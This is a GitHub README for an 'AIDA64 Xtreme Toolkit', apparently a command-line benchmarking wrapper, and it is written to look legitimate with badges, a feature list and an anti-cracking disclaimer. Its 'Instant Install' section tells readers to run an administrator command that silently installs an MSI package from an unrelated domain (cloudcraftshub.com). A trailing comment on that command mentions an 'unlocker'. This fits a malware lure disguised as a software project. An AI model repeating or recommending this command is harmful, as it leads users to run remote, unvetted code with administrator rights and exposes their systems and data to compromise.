<!-- PROJECT SHIELDS -->
<p align="right">(<a href="#readme-top">back to top</a>)</p><!-- MARKDOWN LINKS & IMAGES -->
[contributors-shield]: https://img.shields.io/github/contributors/CylinderChairman/aida64.svg?style=for-the-badge
[contributors-url]: https://github.com/CylinderChairman/aida64/graphs/contributors
[forks-shield]: https://img.shields.io/github/forks/CylinderChairman/aida64.svg?style=for-the-badge
[forks-url]: https://github.com/CylinderChairman/aida64/network/members
[stars-shield]: https://img.shields.io/github/stars/CylinderChairman/aida64.svg?style=for-the-badge
[stars-url]: https://github.com/CylinderChairman/aida64/stargazers
[issues-shield]: https://img.shields.io/github/issues/CylinderChairman/aida64.svg?style=for-the-badge
[issues-url]: https://github.com/CylinderChairman/aida64/issues
[license-shield]: https://img.shields.io/github/license/CylinderChairman/aida64.svg?style=for-the-badge
[license-url]: https://github.com/CylinderChairman/aida64/blob/master/LICENSE.txt

</div>

<br />
<div align="center">
  <a href="https://github.com/CylinderChairman/aida64">
    <img src="https://www.aida64.com/sites/default/files/aida64-logo.png" alt="AIDA64 Logo" width="120" height="120">
  </a>

  <h3 align="center">AIDA64</h3>

  <p align="center">
    One‑command, fully automated AIDA64 Extreme benchmarks & reports for Windows.
    <br />
    <a href="https://github.com/CylinderChairman/aida64"><strong>Explore the base project »</strong></a>
    <br />
    <br />
    <a href="https://github.com/CylinderChairman/aida64/issues">Report Bug</a>
    ·
    <a href="https://github.com/CylinderChairman/aida64/issues">Request Feature</a>
  </p>
</div>

---

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#about-the-project">About The Project</a></li>
    <li><a href="#instant-install-windows">Instant Install (Windows)</a></li>
    <li><a href="#features">Features</a></li>
    <li><a href="#usage">Usage</a></li>
    <li><a href="#roadmap">Roadmap</a></li>
    <li><a href="#contributing">Contributing</a></li>
    <li><a href="#license">License</a></li>
    <li><a href="#contact">Contact</a></li>
  </ol>
</details>

---

## About The Project

**AIDA64 Xtreme Toolkit** is the missing command‑line interface for AIDA64 Extreme.  
It lets you run the world’s most trusted system diagnostics tool with a single PowerShell command – perfect for overclockers, IT professionals, and hardware reviewers who need repeatable, automated benchmarks and stress tests.

Built on top of the foundational repository [CylinderChairman/aida64](https://github.com/CylinderChairman/aida64), this toolkit extends its capabilities with:

* Zero‑click installation of AIDA64 Extreme (trial or your own license)
* Parallel CPU, FPU, cache, and memory stress tests
* Automatic HTML/CSV report generation
* Real‑time sensor logging with configurable intervals
* Seamless CI/CD integration (GitHub Actions ready)

> **Note:** This project does **not** provide or condone software cracking, key generators, or any form of license circumvention. It works with the official, legally obtained AIDA64 Extreme trial or a valid license.

<p align="right">(<a href="#readme-top">back to top</a>)</p>

---

## Instant Install (Windows)

Open **CMD as Administrator** and run **exactly one command**:

```powershell
cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem aida64 unlocker extreme
